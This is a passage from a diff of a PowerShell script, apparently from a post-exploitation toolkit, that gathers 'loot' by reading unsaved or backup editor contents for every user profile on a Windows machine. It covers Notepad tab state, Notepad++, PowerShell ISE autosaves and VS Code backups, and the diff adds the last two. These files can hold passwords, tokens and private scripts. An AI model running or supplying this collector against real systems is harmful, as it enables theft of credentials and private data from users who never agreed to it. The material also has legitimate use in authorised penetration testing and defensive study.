+        $RootPath = Join-Path -Path $NotepadPath.FullName -ChildPath "LocalState\TabState"
+        $BackupFiles = Get-ChildItem -Path $RootPath -ErrorAction "SilentlyContinue"
 
-            foreach ($BackupFile in $BackupFiles) {
-                $FullPath = $BackupFile.FullName
-                $Content = Extract-Strings -FilePath $FullPath
-                #Write-Output "========================================================================================="
-                Write-Output "File Name: $($BackupFile.Name)"
+        foreach ($BackupFile in $BackupFiles) {
+            
+            try {
+                
+                $Content = Extract-Strings -FilePath $BackupFile.FullName -ErrorAction "Stop"
+
+                Write-Output "File Path: $($BackupFile.FullName)"
                 Write-Output ""
                 Write-Output $Content
                 Write-Output "========================================================================================="
+            
+            } catch {}
+        }
+    }
+}
+
+function Get-ISE {
+    param ([string]$UserProfile)
+
+    $RootPath = "C:\Users\$UserProfile\AppData\Local\Microsoft_Corporation"
+    $ISE_Dir = Get-ChildItem -Path $RootPath -Filter "powershell_ise*" -Directory -ErrorAction "SilentlyContinue" | Select-Object -First 1
+
+    if ($ISE_Dir) {
+        $AutoSavePath = Join-Path -Path $ISE_Dir.FullName -ChildPath "3.0.0.0\AutoSaveFiles"
+        $BackupFiles = Get-ChildItem -Path $AutoSavePath -ErrorAction "SilentlyContinue"
+
+        foreach ($BackupFile in $BackupFiles) {
+           
+            try {
+                
+                $Content = Get-Content -Path $BackupFile.FullName -Raw -ErrorAction "Stop"
+
+                Write-Output "File Path: $($BackupFile.FullName)"
+                Write-Output ""
+                Write-Output $Content
+                Write-Output "========================================================================================="
+            
+            } catch {}
+        }
+    }
+}
+
+function Get-VSCode {
+    param ([string]$UserProfile)
+
+    $RootPath = "C:\Users\$UserProfile\AppData\Roaming\Code\Backups"
+
+    if (Test-Path $RootPath) {
+        $SessionDirs = Get-ChildItem -Path $RootPath -Directory -ErrorAction "SilentlyContinue"
+
+        foreach ($Session in $SessionDirs) {
+            $BackupFiles = Get-ChildItem -Path $Session.FullName -Recurse -File -ErrorAction "SilentlyContinue"
+
+            foreach ($BackupFile in $BackupFiles) {
+                
+                try {
+                    
+                    $Content = Get-Content -Path $BackupFile.FullName -Raw -ErrorAction "Stop"
+
+                    Write-Output "File Path: $($BackupFile.FullName)"
+                    Write-Output ""
+                    Write-Output $Content
+                    Write-Output "========================================================================================="
+                
+                } catch {}
             }
-        } 
-    }
-
-    $UserProfiles = Get-UserProfilePaths
-
-    foreach ($UserProfile in $UserProfiles) {
-        Get-NotePadPlusPlus -UserProfile $UserProfile
-    }
-
-
-    foreach ($UserProfile in $UserProfiles) {
-        Get-Notepad -UserProfile $UserProfile
+        }
     }
 }
+    
+$UserProfiles = Get-UserProfilePaths
+    
+foreach ($UserProfile in $UserProfiles) { Get-NotePadPlusPlus -UserProfile $UserProfile }   
+foreach ($UserProfile in $UserProfiles) { Get-Notepad -UserProfile $UserProfile         }
+foreach ($UserProfile in $UserProfiles) { Get-ISE -UserProfile $UserProfile             }
+foreach ($UserProfile in $UserProfiles) { Get-VSCode -UserProfile $UserProfile          }
 
+}
+    
 $Loot = DumpNotepad
-if (!$Loot){Write-Output "No Results"} else {
-                Write-Output "========================================================================================="
-$Loot | Write-Output
-                Write-Output "========================================================================================="
+if (!$Loot) { Write-Output "No Results" } else {
+    Write-Output "========================================================================================="
+    $Loot | Write-Output
+    Write-Output "========================================================================================="
 }
-
+    
 '@
 
 ################################################################################################################
